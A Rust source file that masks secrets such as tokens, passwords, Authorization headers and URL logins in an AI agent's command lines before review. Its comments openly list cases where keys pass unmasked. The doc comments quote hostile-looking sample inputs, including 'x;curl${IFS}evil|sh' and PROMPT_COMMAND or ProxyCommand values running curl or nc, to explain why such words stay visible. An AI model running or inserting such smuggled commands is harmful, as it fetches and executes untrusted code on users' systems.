//! Taking secrets out of what an agent's entry starts before it becomes an
//! item's text: a command line is where a token is written when it is not
//! in a variable (`--api-key …`, a header for `curl`, a login in an
//! address). Only two kinds are taken out: the value of a secret-named
//! assignment, flag or `Authorization` header, and an address's login.
//! What is taken out is hidden from the local rules and the AI alike, and a
//! payload hidden in it would go unread, so only what can be nothing but a
//! value is: a run of token characters (see `is_token_shaped`), never a word
//! with a shell character in it, never a path or an expansion (`$TOKEN`),
//! which are what a review needs to see.
//!
//! A token is never told by its look (`"apiKeyHelper": "sk-ant-…"` is sent
//! as written): a word that looks like one may also be the package a runner
//! fetches, however the command spells it, a host, a path or a file name,
//! and masking anything that could name what runs would hide code from the
//! review. A leaked token is the lesser harm next to an unreviewed payload.
//!
//! Not covered, and sent as written: a secret in a header other than
//! `Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word
//! after a flag named for authorization rather than a secret
//! (`--authorization v`), a header inside a JSON array or object
//! (`'["-H","Authorization: Bearer abc"]'`), and all but the first word of
//! a quoted value of several words (`--token "a b"` sends `b`). Quotes are
//! read as a shell reads them, but for `$(…)` inside double quotes, which
//! starts its own quoting: a quote inside it can leave the line's reading
//! open, so a key after it on the line may be sent.
//!
//! A flag that is named for a secret but takes no value (`--skip-auth pkg`)
//! has the word after it taken out where that word is token-shaped, so a
//! package named there is hidden from the item's text. A script file named
//! there is still followed and reviewed as its own item, since the line is
//! followed before it is masked; a package a runner fetches is not, since
//! only files on this machine are followed. A `--no-` flag is known to take
//! no value, and the word after it is sent.

use crate::sweep::judge::secrets::{REDACTED, is_secret_name, without_secrets};
use crate::sweep::judge::variables::loads_code;

/// What the word before asked of the next one.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Next {
    /// Nothing.
    Word,
    /// It is the value of a flag or assignment named for a secret.
    Value,
    /// It is the value of an `Authorization` header, or its scheme
    /// (`Bearer`), inside the quotes the header opened.
    HeaderValue,
    /// It is the value of a flag that names what runs
    /// (`--password-command`), sent as written, and a quote it opens goes
    /// on as `Code`.
    CodeValue,
    /// It is inside the quoted value of a name that loads code, up to the
    /// word that closes that quote, and is sent as written.
    Code(CodeEnd),
}

/// Which quote ends the value of a name that loads code.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum CodeEnd {
    /// The line's, as `redacted` reads it.
    Line,
    /// One opened inside the line's (`sh -c 'X="…"'`), as it stands so
    /// far, read on its own; the line's closing ends it too.
    Inner(Quote),
}

/// A quote a shell reads a line in.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Quote {
    /// `'…'`: everything is a letter up to the next `'`.
    Single,
    /// `"…"`: a backslash escapes what follows.
    Double,
    /// `$'…'`: a backslash escapes what follows, `\'` too.
    AnsiC,
}

/// `line` with the secrets in it taken out, as `REDACTED`:
///
/// - who an address logs in as (`scheme://user:password@`, the whole of it);
/// - the value of an `Authorization:` header, after its scheme where it has
///   one (`Bearer`, `token`), within the quotes the header opened;
/// - the value of `NAME=value` where a name before an `=` is named for a
///   secret (`GITHUB_TOKEN=x`, `--env=API_KEY=x`, `--token=x`);
/// - the word after a flag named for a secret (`--api-key x`);
/// - what the review's own removal takes out (`export API_KEY=…`).
///
/// Each only where it is token-shaped. The line is read word by word, as
/// blanks split it; quotes around a word stay where they are.
///
/// Nothing else is taken out, so an API key pasted anywhere else
/// (`"apiKeyHelper": "sk-ant-…"`, `echo sk-ant-…`) reaches the AI provider
/// as written. Masking can hide code: a word that looks like a key may also
/// be the package a runner fetches, a host, a path or a file name, and a
/// review that cannot see what runs is worse than a leaked key. Accepted by
/// the owner after a review found every by-look rule hid a package, host or
/// path under some spelling (`pnpm dlx`, `sh -c 'npx …'`, a mirror's host).
pub(super) fn redacted(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let mut next = Next::Word;
    // The quote open before each word, as a shell reads the line so far: a
    // word inside an ordinary quoted phrase (`--msg "fix the PATH"`) never
    // starts the pass-through for what runs.
    let mut quote = None;
    let mut word_start = None;
    let mut take = |word: &str, out: &mut String| {
        out.push_str(&redacted_word(word, quote, &mut next));
        quote = open_after(quote, word);
    };
    for (index, character) in line.char_indices() {
        match (character.is_whitespace(), word_start) {
            (true, Some(start)) => {
                take(&line[start..index], &mut out);
                out.push(character);
                word_start = None;
            }
            (true, None) => out.push(character),
            (false, None) => word_start = Some(index),
            (false, Some(_)) => {}
        }
    }
    if let Some(start) = word_start {
        take(&line[start..], &mut out);
    }
    // The review's own removal too, so what is shown and saved is what is
    // sent (`export API_KEY=…; cmd`).
    without_secrets(&out)
}

/// One word of a line, with the quote open before it and what the word
/// before asked of it.
fn redacted_word(word: &str, quote: Option<Quote>, next: &mut Next) -> String {
    let asked = std::mem::replace(next, Next::Word);
    let opens = open_after(quote, word).is_some();
    // What names what runs is sent as written, but for an address's login,
    // up to and with the word that closes its quote, a lone quote too.
    match asked {
        Next::Code(end) => {
            let end = match end {
                CodeEnd::Line => Some(CodeEnd::Line),
                CodeEnd::Inner(inner) => open_after(Some(inner), word).map(CodeEnd::Inner),
            };
            if let Some(end) = end
                && opens
            {
                *next = Next::Code(end);
            }
            return without_login(word);
        }
        // The value of a flag that names what runs, unless it is another
        // flag (`--no-proxy --api-key k` takes none). A quote it opens is
        // a value (`--proxy-command "-W %h:%p"`).
        Next::CodeValue if opens || !word.trim_start_matches(['"', '\'']).starts_with('-') => {
            if opens {
                *next = Next::Code(CodeEnd::Line);
            }
            return without_login(word);
        }
        Next::CodeValue | Next::Word | Next::Value | Next::HeaderValue => {}
    }
    let asked = if asked == Next::CodeValue {
        Next::Word
    } else {
        asked
    };
    let quotes: &[char] = &['"', '\''];
    let core = word.trim_matches(quotes);
    if core.is_empty() {
        // A lone quote leaves what the word before asked to the next.
        *next = asked;
        return word.to_string();
    }
    if opens && let Some(code) = code_start(word, quote) {
        *next = Next::Code(code);
        return without_login(word);
    }
    if quote.is_none() && core.starts_with('-') && !core.contains('=') && loads_code(core) {
        *next = Next::CodeValue;
        return word.to_string();
    }
    let at = word.len() - word.trim_start_matches(quotes).len();
    let (before, after) = (&word[..at], &word[at + core.len()..]);
    let lower = core.to_ascii_lowercase();
    let core = if asked == Next::HeaderValue && is_auth_scheme(&lower) {
        // `Bearer"` closes the header: what follows is another argument.
        if after.is_empty() {
            *next = Next::HeaderValue;
        }
        core.to_string()
    } else if asked != Next::Word {
        value(core).to_string()
    } else if let Some(at) = lower.find(HEADER) {
        let name_end = at + HEADER.len();
        let rest = &lower[name_end..];
        if rest.is_empty() || is_auth_scheme(rest) {
            if is_header_open(word) {
                *next = Next::HeaderValue;
            }
            core.to_string()
        } else {
            format!("{}{}", &core[..name_end], value(&core[name_end..]))
        }
    } else {
        let core = without_login(core);
        if core.starts_with('-')
            && !core.starts_with("--no-")
            && !core.contains('=')
            && is_secret_named(&core)
        {
            *next = Next::Value;
            core
        } else {
            without_assigned_secret(&core).unwrap_or(core)
        }
    };
    format!("{before}{core}{after}")
}

/// The header whose value is taken out, in lower case.
const HEADER: &str = "authorization:";

/// Whether the header in `word` goes on in the next word: it is inside
/// quotes that open before it (`"Authorization:`, `--header="Authorization:`,
/// `-H"Authorization:`) and do not close after it. A word after the closing
/// quote, or after a bare `Authorization:`, is another argument, such as
/// the address a download comes from, and is sent as written.
fn is_header_open(word: &str) -> bool {
    let is_quote = |c: char| matches!(c, '"' | '\'');
    let Some(at) = word.to_ascii_lowercase().find(HEADER) else {
        return false;
    };
    word[..at].chars().filter(|&c| is_quote(c)).count() % 2 == 1 && !word[at..].contains(is_quote)
}

/// Whether the flag or name `name` holds a secret: the last part of it is a
/// secret word (`--api-key`, `--authToken`, `GITHUB_TOKEN`). A part before
/// it says what the value is for, not that it is one: `--auth-command`,
/// `--token-file` and `--password-stdin` take a program, a file or nothing,
/// which the review must see. The review's own removal (`is_secret_name`)
/// counts any part, for the assignments of start-up files. A name whose
/// value loads code (`core.askPass`, `--ask-pass`) is never asked about:
/// its value is sent before this is.
fn is_secret_named(name: &str) -> bool {
    let word = name
        .rsplit(|c: char| !c.is_ascii_alphanumeric())
        .next()
        .unwrap_or(name);
    let bytes = word.as_bytes();
    let start = (1..bytes.len())
        .rev()
        .find(|&i| {
            bytes[i].is_ascii_uppercase()
                && (bytes[i - 1].is_ascii_lowercase() || bytes[i - 1].is_ascii_digit())
        })
        .unwrap_or(0);
    is_secret_name(&word[start..])
}

/// Whether `word`, which opens a quote, names what runs, so the words up to
/// the one that closes it are part of what runs: a name that loads code
/// before an `=` (`PROMPT_COMMAND="export`, `-oProxyCommand="nc`,
/// `--env=PROMPT_COMMAND=$'npx`, `"core.sshCommand=ssh`), or the word itself
/// (ssh's `"ProxyCommand nc …"`).
fn names_code(word: &str) -> bool {
    word.split('=').rev().skip(1).any(is_code_name) || is_code_name(word)
}

/// Whether `word`, which leaves a quote open after the one `quote` open
/// before it, starts what runs, and the quote that then ends it:
///
/// - inside a quote, the value of a name that loads code that opens with
///   the other kind of quote right after its `=` (`sh -c 'export
///   PROMPT_COMMAND="curl …"'`), which a shell started there reads: that
///   inner quote;
/// - outside quotes, a word that names what runs (see `names_code`): the
///   line's quote. Only such a word does, so the last word of a quoted
///   phrase (`"You are an agent"`) is not a name.
fn code_start(word: &str, quote: Option<Quote>) -> Option<CodeEnd> {
    let inner = word.match_indices('=').find_map(|(at, _)| {
        let outer = open_after(quote, &word[..at])?;
        let other = if outer == Quote::Single { '"' } else { '\'' };
        let value = &word[at + 1..];
        (value.starts_with(other) && is_code_name(&word[..at]))
            .then(|| open_after(None, value))
            .flatten()
    });
    match inner {
        Some(inner) => Some(CodeEnd::Inner(inner)),
        None => (quote.is_none() && names_code(word)).then_some(CodeEnd::Line),
    }
}

/// The quote left open after `word`, read as a shell reads quotes from the
/// one `open` before it: a quote of the other kind inside one is a letter,
/// and a backslash escapes what follows outside single quotes.
fn open_after(open: Option<Quote>, word: &str) -> Option<Quote> {
    let mut open = open;
    let mut characters = word.chars().peekable();
    while let Some(character) = characters.next() {
        match (open, character) {
            (Some(Quote::Single | Quote::AnsiC), '\'') | (Some(Quote::Double), '"') => open = None,
            (None, '$') if characters.peek() == Some(&'\'') => {
                characters.next();
                open = Some(Quote::AnsiC);
            }
            (None, '\'') => open = Some(Quote::Single),
            (None, '"') => open = Some(Quote::Double),
            (None | Some(Quote::Double | Quote::AnsiC), '\\') => {
                characters.next();
            }
            _ => {}
        }
    }
    open
}

/// Whether `part`, the text before an `=`, names a variable, setting or
/// flag that loads code (`PROMPT_COMMAND`, `core.askPass`,
/// `-oProxyCommand`, `--password-command`).
fn is_code_name(part: &str) -> bool {
    loads_code(part.trim_start_matches(['"', '\'']))
}

/// Whether `text`, after an `@`, is a host, so what is before the `@` is a
/// login: anything but an image digest (`docker://alpine@sha256:ab…` names
/// the image, which the review must see). A port need not be a number
/// (`localhost:${PORT}`).
fn is_host(text: &str) -> bool {
    !text
        .split_once(':')
        .is_some_and(|(algorithm, _)| matches!(algorithm, "sha256" | "sha384" | "sha512"))
}

/// Whether `lower` is the scheme of an `Authorization` header, which says
/// what kind the value after it is (`Bearer x`, `token x`).
fn is_auth_scheme(lower: &str) -> bool {
    matches!(lower, "bearer" | "basic" | "token" | "digest")
}

/// Whether `word` can be nothing but a value: token characters only
/// (letters, digits and `._~%+=:-`), and not a path, an expansion or a
/// flag (`--token --package=evil-pkg`).
/// Anything with a shell character in it (`x;curl${IFS}evil|sh`) may be
/// code, and taking it out would hide it from the review. `/` is no token
/// character, so an address or a path (`--auth-url https://…`,
/// `--password-command bin/x.sh`) is always sent: a token of base64 with a
/// `/` in it is then sent too, the lesser harm next to hiding what runs.
fn is_token_shaped(word: &str) -> bool {
    !word.is_empty()
        && !word.starts_with(['~', '.', '-'])
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "._~%+=:-".contains(c))
}

/// `word` as the value of something named for a secret: taken out where it
/// is token-shaped, else as written.
fn value(word: &str) -> &str {
    if is_token_shaped(word) {
        REDACTED
    } else {
        word
    }
}

/// `word` with the value after the first name before an `=` that is named
/// for a secret taken out (`--env=API_KEY=x`); `None` where no such name
/// is in it.
fn without_assigned_secret(word: &str) -> Option<String> {
    let mut name_end = 0;
    for part in word.split('=') {
        let value_start = name_end + part.len() + 1;
        // What a name that loads code is set to is part of what runs, an
        // assignment in it too (`GIT_CONFIG_PARAMETERS='x.password=y'`). A
        // flag's value is not: `--env-file=API_KEY=k` names a file, then
        // sets a key.
        let flag = part.trim_start_matches(['"', '\'']).starts_with('-');
        if value_start > word.len() || (is_code_name(part) && !flag) {
            break;
        }
        if is_secret_named(part) {
            return Some(format!(
                "{}={}",
                &word[..value_start - 1],
                value(&word[value_start..])
            ));
        }
        name_end = value_start;
    }
    None
}

/// `word` with who each address in it logs in as taken out, where that is
/// token-shaped: `git+https://ghp_x@github.com/r` is
/// `git+https://github.com/r`.
fn without_login(word: &str) -> String {
    let mut out = String::with_capacity(word.len());
    let mut rest = word;
    while let Some(at) = rest.find("://") {
        let (before, after) = rest.split_at(at + 3);
        out.push_str(before);
        let end = after
            .find(|c: char| matches!(c, '/' | '?' | '#' | '"' | '\'') || c.is_whitespace())
            .unwrap_or(after.len());
        let authority = &after[..end];
        out.push_str(
            authority
                .rsplit_once('@')
                .filter(|(login, host)| is_token_shaped(login) && is_host(host))
                .map_or(authority, |(_, host)| host),
        );
        rest = &after[end..];
    }
    out.push_str(rest);
    out
}
